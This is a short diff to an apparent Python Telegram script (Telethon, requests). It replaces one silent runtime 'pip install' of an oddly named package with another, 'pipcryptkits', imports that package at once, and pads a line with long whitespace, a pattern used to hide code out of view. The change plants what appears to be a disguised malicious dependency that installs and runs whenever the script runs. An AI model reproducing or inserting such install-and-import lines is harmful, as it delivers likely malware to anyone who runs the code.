@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqladdV1")
-import pipsqladdV1
+os.system("pip install pipcryptkits")
+import pipcryptkits
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
